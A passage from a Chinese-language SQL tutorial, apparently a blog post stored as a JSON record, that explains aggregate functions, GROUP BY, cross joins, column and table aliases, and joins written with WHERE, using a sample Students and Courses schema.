Age;\n\n聚合查询聚合函数假设我们要统计学生表的记录数量，除了直接使用SELECT * FROM Students得到结果集后，通过手动查询数量这种麻烦的方法外，我们可以使用SQL提供的聚合函数 COUNT，快速获得结果。以查询有多少学生为例，我们以下SQL语句：\nSELECT COUNT(*) FROM Students;\n\n除了 COUNT 函数外，SQL还提供以下这些常用的聚合函数：\n\n\n\n函数\n说明\n\n\n\nSUM\n计算某一列的总和，该列必须为数值类型\n\n\nAVG\n计算某一列的平均数，该列必须为数值类型\n\n\nMAX\n计算某一列的最大值\n\n\nMIN\n计算某一列的最小值\n\n\n分组SQL还提供了“分组聚合”功能，帮助我们将具有共性字段的记录整合起来。比如我们想要根据城市City对学生进行分组，并需要查询每个城市有多少学生，可以使用GROUP BY语句：\nSELECT City, COUNT(*) FROM Students GROUP BY City;\n\n执行此语句后，GROUP BY子句会按照City将学生进行分组，所有City相同的学生会被放到同一个组中，再进行分别计算，所以COUNT(*)的结果对应的就是特定城市的学生数量。其结果类似以下：\n\n\n\nCity\nCOUNT(*)\n\n\n\nBeijing\n1\n\n\nLos Angeles\n2\n\n\nNew York City\n1\n\n\nShanghai\n2\n\n\n如果我们将Name也放入查询结果，就不合适了，因为来自相同城市的学生可能有很多位，名字就各不相同了，所以以下语句是不合法的：\nSELECT City, COUNT(*), Name FROM Students GROUP BY City;\n\nGROUP BY 也能放入多个字段，比如我们想先将学生根据City分组，然后再根据性别分组，可以使用以下语句：\nSELECT City, Gender, COUNT(*) FROM Students GROUP BY City, Gender;\n\n多表查询SELECT 查询除了能从单表中查数据外，也能从多表中查询数据。语法如下：\nSELECT * FROM table1, table2;\n\n比如要查询Students表和Courses表的“乘积”，可以使用以下语句：\nSELECT * FROM Students, Courses;\n\n假设Students有5列字段和7行记录，Courses有2列字段和3行记录，其结果就是一个拥有21 (3 * 7) 行记录和 7 (5 + 2) 列字段的二维表，既Students表的每一行和Courses表的每一行两两拼在一起。结果集的列数会是两表列数之和，而行数是两表行数之积。\n有时候两张表可能拥有相同名字的字段，那么结果则会让人疑惑，我们可以通过使用 AS 取别名来区别字段。比如使用以下语句给StudentID和CourseID改名为StudentId和CourseId：\nSELECT Students.StudentID AS StudentId, Courses.CourseID AS CourseId FROM Students, Courses;\n\n给字段取别名的语法类似 column_name AS new_column_name，上面的语句分别给StudentID和CoursesID取了别名StudentId和CourseId，虽然在这个例子中，我们只是将最后的字母D变为小写。但考虑一下另一种情况：假设Students和Courses的主键字段都叫ID，那么这个别名就很有帮助了，我们可以使用以下语句使查询结果更明了：\nSELECT Students.ID AS StudentId, Courses.ID AS CourseId FROM Students, Courses;\n\n除了给输出字段取别名外，给表格取别名也很有用的，语法类似table_name AS alias，我们可以将上面的语句写成下面这样：\nSELECT S.ID AS StudentId, C.ID AS CourseId FROM Students AS S, Courses AS C;\n\n在多表查询中，我们同样还是能使用WHERE子句。为了帮助大家理解之后的内容，我们需要给Students添加一列新的字段CourseID，代表此学生选择的课程：\n\n\n\nStudentID\nName\nGender\nAge\nCity\nCourseID\n\n\n\n1\nDavid\nM\n21\nShanghai\n2\n\n\n如果我们如果想要抓取StudentID和其对应的课程名字，可以使用以下语句：\nSELECT S.StudentID, C.CourseName FROM Students AS S, Courses AS C WHERE S.CourseID = C.CourseID;\n\n除了WHERE子句，其他子句类似ORDER BY，GROUP BY也都适用于多表查询。\n","categories":["数据库"],"tags":["SQL"]}]